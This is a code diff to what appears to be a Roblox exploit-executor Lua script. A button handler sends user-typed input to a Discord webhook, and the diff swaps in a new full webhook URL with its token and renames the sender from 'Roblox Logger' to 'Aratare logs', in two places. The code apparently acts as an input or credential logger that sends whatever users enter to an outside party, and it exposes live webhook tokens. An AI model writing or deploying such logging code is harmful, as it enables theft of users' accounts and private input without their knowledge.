@@ -153,13 +153,13 @@ checkmarkButton.MouseButton1Click:Connect(function()
 local HttpService = game:GetService("HttpService")
 
 -- Your Discord Webhook URL
-local WebhookURL = "https://discord.com/api/webhooks/1364344487295455302/n1KWqURr1a5ckzIEK55mA0jIvViGo7UNpbicnSlHaJTqdi9pvOTJAaa5Q_WyIWvHAVGY"
+local WebhookURL = "https://discord.com/api/webhooks/1367093902716178522/vup-gP9Z772LFbOzP4Ygze_sv4lh6HYOqEfLxblZv2TqqFr6lZiyL1MKObEHqjs31Hz6"
 
 -- Function to send log to Discord
 local function sendToDiscord(message)
     local data = {
         ["content"] = message,
-        ["username"] = "Roblox Logger"
+        ["username"] = "Aratare logs"
     }
     
     local request = syn and syn.request or http_request or request or (http and http.request)
@@ -223,13 +223,13 @@ end
 print(userInput)
 
 -- Your Discord Webhook URL
-local WebhookURL = "https://discord.com/api/webhooks/1364344487295455302/n1KWqURr1a5ckzIEK55mA0jIvViGo7UNpbicnSlHaJTqdi9pvOTJAaa5Q_WyIWvHAVGY"
+local WebhookURL = "https://discord.com/api/webhooks/1367093902716178522/vup-gP9Z772LFbOzP4Ygze_sv4lh6HYOqEfLxblZv2TqqFr6lZiyL1MKObEHqjs31Hz6"
 
 -- Function to send log to Discord
 local function sendToDiscord(message)
     local data = {
         ["content"] = message,
-        ["username"] = "Roblox Logger"
+        ["username"] = "Aratare logs"
     }
     
     local request = syn and syn.request or http_request or request or (http and http.request)
